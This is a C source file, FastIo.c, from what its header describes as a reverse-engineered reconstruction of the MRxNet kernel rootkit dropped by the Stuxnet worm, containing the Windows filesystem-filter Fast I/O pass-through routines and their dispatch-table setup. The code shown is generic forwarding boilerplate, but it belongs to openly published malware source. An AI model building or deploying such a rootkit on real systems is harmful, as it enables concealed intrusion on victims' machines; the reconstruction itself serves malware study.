/*++

 Copyright (C) 2010-2011 Amr Thabet <amr.thabet[at]student.alx.edu.eg>

Module Name:

    FastIo.c

Abstract:

  This Module Contain The reversed MRxNet rootkit dropped by Stuxnet worm.
    This File For The FastIoDispatch Routines

Licence:
  
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation; either version 2 of the License, or
     (at your option) any later version.
   
     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.
   
     You should have received a copy of the GNU General Public License
     along with this program; if not, write to Amr Thabet 
     amr.thabet@student.alx.edu.eg
   
Environment:

    Kernel mode

--*/

//Decleration
//------------

#include <ntifs.h>

typedef struct _DEVICE_EXTENSION
{
  PDEVICE_OBJECT AttachedDevice;
  PETHREAD pThreadObj;
  
}_DEVICE_EXTENSION, *PDEVICE_EXTENSION;
PDEVICE_OBJECT  DeviceObject;

//Data:
//-----

extern FAST_IO_DISPATCH g_fastIoDispatch;
extern PDRIVER_OBJECT DriverObject;

/**-------------------------------------------------------------------

    SetFastIoDispatch

----------------------------------------------------------------------**/


PFAST_IO_DISPATCH GetNextIODispatch (PDEVICE_OBJECT DeviceObject,PDEVICE_OBJECT* nextDeviceObject)
{
  if (DeviceObject == 0 || DeviceObject->DeviceExtension == 0)return 0;
   *nextDeviceObject = ((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->AttachedDevice;
   return (*nextDeviceObject)->DriverObject->FastIoDispatch;
}

BOOLEAN FsFilterFastIoCheckIfPossible(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in BOOLEAN            Wait,
    __in ULONG              LockKey,
    __in BOOLEAN            CheckForReadOperation,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    PDEVICE_OBJECT nextDeviceObject;
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 8 || NextFastIoDispatch->FastIoCheckIfPossible == 0){
      return 0;
    };
    return (NextFastIoDispatch->FastIoCheckIfPossible)(
            FileObject,
            FileOffset,
            Length,
            Wait,
            LockKey,
            CheckForReadOperation,
            IoStatus,
            nextDeviceObject);
};


BOOLEAN FsFilterFastIoRead(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in BOOLEAN            Wait,
    __in ULONG              LockKey,
    __out PVOID             Buffer,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //

   PDEVICE_OBJECT nextDeviceObject;
   PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
   if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0xC || NextFastIoDispatch->FastIoRead == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoRead)(
            FileObject,
            FileOffset,
            Length,
            Wait,
            LockKey,
            Buffer,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoWrite(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in BOOLEAN            Wait,
    __in ULONG              LockKey,
    __in PVOID              Buffer,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
   PDEVICE_OBJECT nextDeviceObject;  
   PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
   if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x10 || NextFastIoDispatch->FastIoWrite == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoWrite)(
            FileObject,
            FileOffset,
            Length,
            Wait,
            LockKey,
            Buffer,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoQueryBasicInfo(
    __in PFILE_OBJECT       FileObject,
    __in BOOLEAN            Wait,
    __out PFILE_BASIC_INFORMATION Buffer,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x14 || NextFastIoDispatch->FastIoQueryBasicInfo == 0){
      return FALSE;
    };

        return (NextFastIoDispatch->FastIoQueryBasicInfo)(
            FileObject,
            Wait,
            Buffer,
            IoStatus,
            nextDeviceObject);
    
}

BOOLEAN FsFilterFastIoQueryStandardInfo(
    __in PFILE_OBJECT       FileObject,
    __in BOOLEAN            Wait,
    __out PFILE_STANDARD_INFORMATION Buffer,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
   PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
   if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x18 || NextFastIoDispatch->FastIoQueryStandardInfo == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoQueryStandardInfo)(
            FileObject,
            Wait,
            Buffer,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoLock(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in PLARGE_INTEGER     Length,
    __in PEPROCESS          ProcessId,
    __in ULONG              Key,
    __in BOOLEAN            FailImmediately,
    __in BOOLEAN            ExclusiveLock,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x1C || NextFastIoDispatch->FastIoLock == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoLock)(
            FileObject,
            FileOffset,
            Length,
            ProcessId,
            Key,
            FailImmediately,
            ExclusiveLock,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoUnlockSingle(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in PLARGE_INTEGER     Length,
    __in PEPROCESS          ProcessId,
    __in ULONG              Key,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x20 || NextFastIoDispatch->FastIoUnlockSingle == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoUnlockSingle)(
            FileObject,
            FileOffset,
            Length,
            ProcessId,
            Key,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoUnlockAll(
    __in PFILE_OBJECT       FileObject,
    __in PEPROCESS          ProcessId,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x24 || NextFastIoDispatch->FastIoUnlockAll == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoUnlockAll)(
            FileObject,
            ProcessId,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoUnlockAllByKey(
    __in PFILE_OBJECT       FileObject,
    __in PVOID              ProcessId,
    __in ULONG              Key,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x28 || NextFastIoDispatch->FastIoUnlockAllByKey == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoUnlockAllByKey)(
            FileObject,
            ProcessId,
            Key,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoDeviceControl(
    __in PFILE_OBJECT       FileObject,
    __in BOOLEAN            Wait,
    __in_opt PVOID          InputBuffer,
    __in ULONG              InputBufferLength,
    __out_opt PVOID         OutputBuffer,
    __in ULONG              OutputBufferLength,
    __in ULONG              IoControlCode,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x2C || NextFastIoDispatch->FastIoDeviceControl == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoDeviceControl)(
            FileObject,
            Wait,
            InputBuffer,
            InputBufferLength,
            OutputBuffer,
            OutputBufferLength,
            IoControlCode,
            IoStatus,
            nextDeviceObject);
}

VOID FsFilterFastIoDetachDevice(
    __in PDEVICE_OBJECT     SourceDevice,
    __in PDEVICE_OBJECT     TargetDevice
    )
{
    //
    //  Detach from the file system's volume device object.
    //

    IoDetachDevice(TargetDevice);
    IoDeleteDevice(SourceDevice);
}

BOOLEAN FsFilterFastIoQueryNetworkOpenInfo(
    __in PFILE_OBJECT       FileObject,
    __in BOOLEAN            Wait,
    __out PFILE_NETWORK_OPEN_INFORMATION Buffer,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x3C || NextFastIoDispatch->FastIoQueryNetworkOpenInfo == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoQueryNetworkOpenInfo)(
            FileObject,
            Wait,
            Buffer,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoMdlRead(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in ULONG              LockKey,
    __out PMDL*             MdlChain,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x44 || NextFastIoDispatch->MdlRead == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->MdlRead)(
            FileObject,
            FileOffset,
            Length,
            LockKey,
            MdlChain,
            IoStatus,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoMdlReadComplete(
    __in PFILE_OBJECT       FileObject,
    __in PMDL               MdlChain,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x48 || NextFastIoDispatch->MdlReadComplete == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->MdlReadComplete)(
            FileObject,
            MdlChain,
            nextDeviceObject);

}

BOOLEAN FsFilterFastIoPrepareMdlWrite(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in ULONG              LockKey,
    __out PMDL*             MdlChain,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x4C || NextFastIoDispatch->PrepareMdlWrite == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->PrepareMdlWrite)(
            FileObject,
            FileOffset,
            Length,
            LockKey,
            MdlChain,
            IoStatus,
            nextDeviceObject);
    return FALSE;
}

BOOLEAN FsFilterFastIoMdlWriteComplete(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in PMDL               MdlChain,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x50 || NextFastIoDispatch->MdlWriteComplete == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->MdlWriteComplete)(
            FileObject,
            FileOffset,
            MdlChain,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoReadCompressed(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in ULONG              LockKey,
    __out PVOID             Buffer,
    __out PMDL*             MdlChain,
    __out PIO_STATUS_BLOCK  IoStatus,
    __out struct _COMPRESSED_DATA_INFO* CompressedDataInfo,
    __in ULONG              CompressedDataInfoLength,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x54 || NextFastIoDispatch->FastIoReadCompressed == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoReadCompressed)(
            FileObject,
            FileOffset,
            Length,
            LockKey,
            Buffer,
            MdlChain,
            IoStatus,
            CompressedDataInfo,
            CompressedDataInfoLength,
            nextDeviceObject);
}

BOOLEAN FsFilterFastIoWriteCompressed(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in ULONG              Length,
    __in ULONG              LockKey,
    __in PVOID              Buffer,
    __out PMDL*             MdlChain,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in struct _COMPRESSED_DATA_INFO*  CompressedDataInfo,
    __in ULONG              CompressedDataInfoLength,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x58 || NextFastIoDispatch->FastIoWriteCompressed == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->FastIoWriteCompressed)(
            FileObject,
            FileOffset,
            Length,
            LockKey,
            Buffer,
            MdlChain,
            IoStatus,
            CompressedDataInfo,
            CompressedDataInfoLength,
            nextDeviceObject );

}

BOOLEAN FsFilterFastIoMdlReadCompleteCompressed(
    __in PFILE_OBJECT       FileObject,
    __in PMDL               MdlChain,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x5C || NextFastIoDispatch->MdlReadCompleteCompressed == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->MdlReadCompleteCompressed)(
            FileObject,
            MdlChain,
            nextDeviceObject);
    
}

BOOLEAN FsFilterFastIoMdlWriteCompleteCompressed(
    __in PFILE_OBJECT       FileObject,
    __in PLARGE_INTEGER     FileOffset,
    __in PMDL               MdlChain,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x60 || NextFastIoDispatch->MdlWriteCompleteCompressed == 0){
      return FALSE;
    };
        return (NextFastIoDispatch->MdlWriteCompleteCompressed)(
            FileObject,
            FileOffset,
            MdlChain,
            nextDeviceObject);
    
}

BOOLEAN FsFilterFastIoQueryOpen(
    __in PIRP               Irp,
    __out PFILE_NETWORK_OPEN_INFORMATION NetworkInformation,
    __in PDEVICE_OBJECT     DeviceObject
    )
{
    //
    //  Pass through logic for this type of Fast I/O
    //
    PDEVICE_OBJECT nextDeviceObject;  
    PFAST_IO_DISPATCH NextFastIoDispatch = GetNextIODispatch(DeviceObject,&nextDeviceObject);
    if ( NextFastIoDispatch == 0 || NextFastIoDispatch->SizeOfFastIoDispatch <= 0x64 || NextFastIoDispatch->FastIoQueryOpen == 0){
      return FALSE;
    };
    return (NextFastIoDispatch->FastIoQueryOpen)(
            Irp,
            NetworkInformation,
            nextDeviceObject);
}

VOID SetFastIoDispatch(){ 
    g_fastIoDispatch.SizeOfFastIoDispatch     = sizeof(FAST_IO_DISPATCH);
    g_fastIoDispatch.FastIoCheckIfPossible    = FsFilterFastIoCheckIfPossible;
    g_fastIoDispatch.FastIoRead               = FsFilterFastIoRead;
    g_fastIoDispatch.FastIoWrite              = FsFilterFastIoWrite;
    g_fastIoDispatch.FastIoQueryBasicInfo     = FsFilterFastIoQueryBasicInfo;
    g_fastIoDispatch.FastIoQueryStandardInfo  = FsFilterFastIoQueryStandardInfo;
    g_fastIoDispatch.FastIoLock               = FsFilterFastIoLock;
    g_fastIoDispatch.FastIoUnlockSingle       = FsFilterFastIoUnlockSingle;
    g_fastIoDispatch.FastIoUnlockAll          = FsFilterFastIoUnlockAll;
    g_fastIoDispatch.FastIoUnlockAllByKey     = FsFilterFastIoUnlockAllByKey;
    g_fastIoDispatch.FastIoDeviceControl      = FsFilterFastIoDeviceControl;
    g_fastIoDispatch.FastIoDetachDevice       = FsFilterFastIoDetachDevice;
    g_fastIoDispatch.FastIoQueryNetworkOpenInfo = FsFilterFastIoQueryNetworkOpenInfo;
    g_fastIoDispatch.MdlRead            = FsFilterFastIoMdlRead;
    g_fastIoDispatch.MdlReadComplete          = FsFilterFastIoMdlReadComplete;
    g_fastIoDispatch.PrepareMdlWrite          = FsFilterFastIoPrepareMdlWrite;
    g_fastIoDispatch.MdlWriteComplete         = FsFilterFastIoMdlWriteComplete;
    g_fastIoDispatch.FastIoReadCompressed     = FsFilterFastIoReadCompressed;
    g_fastIoDispatch.FastIoWriteCompressed    = FsFilterFastIoWriteCompressed;
    g_fastIoDispatch.MdlReadCompleteCompressed = FsFilterFastIoMdlReadCompleteCompressed;
    g_fastIoDispatch.MdlWriteCompleteCompressed = FsFilterFastIoMdlWriteCompleteCompressed;
    g_fastIoDispatch.FastIoQueryOpen          = FsFilterFastIoQueryOpen;
    DriverObject->FastIoDispatch              =  &g_fastIoDispatch;
};
